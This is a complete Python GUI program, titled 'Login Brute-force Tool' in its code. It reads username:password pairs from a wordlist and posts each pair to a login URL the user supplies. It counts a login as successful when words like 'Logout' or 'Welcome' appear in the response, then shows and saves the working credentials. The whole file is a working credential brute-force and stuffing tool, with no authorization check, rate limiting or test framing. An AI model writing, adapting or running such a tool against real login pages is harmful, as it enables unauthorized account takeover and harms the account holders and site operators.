import customtkinter as ctk
from tkinter import filedialog, messagebox
import sys
try:
    import requests
except Exception:
    requests = None
import threading

# Function to attempt login
def attempt_login(url, username, password):
    payload = {
        'username': username,
        'password': password
    }
    try:
        if requests is None:
            # requests missing — notify user via a non-blocking return
            return False
        response = requests.post(url, data=payload)
        if "Logout" in response.text or "update" in response.text or "Welcome" in response.text or "Profile" in response.text:
            return True
        else:
            return False
    except Exception as e:
        return False

# GUI Application
class LoginTool(ctk.CTk):
    def __init__(self, default_url=None, default_wordlist=None):
        super().__init__()
        
        self.title("Login Brute-force Tool")
        self.geometry("700x500")
        
        self.attack_in_progress = False
        self.result_text = ""

        self.url_label = ctk.CTkLabel(self, text="URL:")
        self.url_label.pack(pady=10)
        self.url_entry = ctk.CTkEntry(self, width=350)
        self.url_entry.pack(pady=10)
        if default_url:
            self.url_entry.insert(0, default_url)
        
        self.wordlist_frame = ctk.CTkFrame(self)
        self.wordlist_frame.pack(pady=10)

        self.wordlist_label = ctk.CTkLabel(self.wordlist_frame, text="Wordlist File (username:password):")
        self.wordlist_label.grid(row=0, column=0, padx=5)
        self.wordlist_entry = ctk.CTkEntry(self.wordlist_frame, width=250)
        self.wordlist_entry.grid(row=0, column=1, padx=5)
        if default_wordlist:
            self.wordlist_entry.insert(0, default_wordlist)
        self.browse_button = ctk.CTkButton(self.wordlist_frame, text="Browse", command=self.browse_wordlist)
        self.browse_button.grid(row=0, column=2, padx=5)
        
        self.status_label = ctk.CTkLabel(self, text="Status:")
        self.status_label.pack(pady=10)
        self.status_text = ctk.CTkLabel(self, text="")
        self.status_text.pack(pady=10)
        
        self.button_frame = ctk.CTkFrame(self)
        self.button_frame.pack(pady=10)
        
        self.start_button = ctk.CTkButton(self.button_frame, text="Start Attack", command=self.start_attack)
        self.start_button.grid(row=0, column=0, padx=10)
        
        self.cancel_button = ctk.CTkButton(self.button_frame, text="Cancel", command=self.cancel_attack)
        self.cancel_button.grid(row=0, column=1, padx=10)
        
        self.clear_button = ctk.CTkButton(self.button_frame, text="Clear", command=self.clear_fields)
        self.clear_button.grid(row=0, column=2, padx=10)

        self.save_button = ctk.CTkButton(self.button_frame, text="Save Result", command=self.save_result)
        self.save_button.grid(row=0, column=3, padx=10)
    
    # Browse wordlist function
    def browse_wordlist(self):
        wordlist_path = filedialog.askopenfilename(title="Select Wordlist File", filetypes=[("Text Files", "*.txt")])
        if wordlist_path:
            self.wordlist_entry.delete(0, ctk.END)
            self.wordlist_entry.insert(0, wordlist_path)
    
    # start attack function
    def start_attack(self):
        if self.attack_in_progress:
            self.status_text.configure(text="Attack already in progress.")
            return
        
        self.attack_in_progress = True
        self.result_text = ""
        url = self.url_entry.get()
        wordlist_path = self.wordlist_entry.get()
        
        if not wordlist_path:
            self.status_text.configure(text="Please select a wordlist file.")
            self.attack_in_progress = False
            return
        
        self.status_text.configure(text="Attempting to login...")
        self.update()
        
        # Run the attack in a separate thread
        # If requests is missing, alert user
        if requests is None:
            self.status_text.configure(text="'requests' library not installed. Install with: pip install requests")
            messagebox.showerror("Missing dependency", "The 'requests' package is required. Run: pip install requests")
            self.attack_in_progress = False
            return
        threading.Thread(target=self.run_attack, args=(url, wordlist_path)).start()
    

    def run_attack(self, url, wordlist_path):
        try:
            with open(wordlist_path, 'r') as file:
                for line in file:
                    if not self.attack_in_progress:  # Check if the attack was cancelled
                        self.status_text.configure(text="Attack cancelled.")
                        return
                    
                    line = line.strip()
                    if ":" in line:
                        username, password = line.split(":", 1)
                        success = attempt_login(url, username, password)
                        if success:
                            result = f"Login successful with username: {username} and password: {password}"
                            self.status_text.configure(text=result)
                            self.result_text = result
                            self.attack_in_progress = False
                            return
                        else:
                            self.status_text.configure(text=f"Trying username: {username} with password: {password}")
                            self.update()
                    else:
                        self.status_text.configure(text="Invalid format in wordlist. Each line should be 'username:password'.")
                        self.attack_in_progress = False
                        return
        except Exception as e:
            self.status_text.configure(text=f"Error reading wordlist: {str(e)}")
            self.attack_in_progress = False
            return
        
        self.status_text.configure(text="No successful login found.")
        self.result_text = "No successful login found."
        self.attack_in_progress = False
    
    # Cancel Process
    def cancel_attack(self):
        self.attack_in_progress = False
    
    # clear Process
    def clear_fields(self):
        self.url_entry.delete(0, ctk.END)
        self.wordlist_entry.delete(0, ctk.END)
        self.status_text.configure(text="")
        self.result_text = ""
    
    # save Result
    def save_result(self):
        if self.result_text:
            save_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
            if save_path:
                with open(save_path, 'w') as file:
                    file.write(self.result_text)
                self.status_text.configure(text="Result saved successfully.")
        else:
            self.status_text.configure(text="No result to save.")

def main():
    # optional args: [url] [wordlist_path]
    default_url = None
    default_wordlist = None
    if len(sys.argv) > 1:
        default_url = sys.argv[1]
    if len(sys.argv) > 2:
        default_wordlist = sys.argv[2]
    app = LoginTool(default_url=default_url, default_wordlist=default_wordlist)
    app.mainloop()


if __name__ == "__main__":
    main()
